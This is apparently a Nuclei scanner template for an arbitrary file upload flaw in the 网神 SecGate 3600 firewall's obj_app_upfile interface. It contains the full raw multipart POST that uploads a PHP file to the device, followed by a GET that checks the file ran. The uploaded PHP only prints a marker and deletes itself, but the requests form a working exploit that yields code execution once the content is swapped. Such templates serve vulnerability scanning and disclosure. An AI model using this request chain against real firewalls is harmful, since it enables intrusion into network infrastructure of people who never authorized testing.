id: nsfocus-secgate-3600-upload

info:
  name: "网神 SecGate 3600 防火墙 obj_app_upfile 接口任意文件上传"
  author: 0dayPoc
  severity: high
  description: |-
    网神 SecGate 3600 防火墙的 obj_app_upfile 接口未正确验证上传文件类型与路径，导致攻击者可通过构造恶意请求实现任意文件上传。该缺陷允许在目标系统存储可执行内容，可能进一步导致远程代码执行或服务劫持。漏洞披露时间为 2023-12-04，受影响组件需通过接口参数校验机制加固以消除风险。
  tags: 网神-SecGate-3600

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /?g=obj_app_upfile HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc

    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
    Content-Disposition: form-data; name="MAX_FILE_SIZE"

    10000000
    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
    Content-Disposition: form-data; name="upfile"; filename="NTest.php"
    Content-Type: text/plain

    <?php echo 'NdayTest'; unlink(__FILE__); ?>
    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
    Content-Disposition: form-data; name="submit_post"

    obj_app_upfile
    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
    Content-Disposition: form-data; name="__hash__"

    0b9d6b1ab7479ab69d9f71b05e0e9445
    ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
- raw:
  - |
    GET /attachements/NTest.php HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
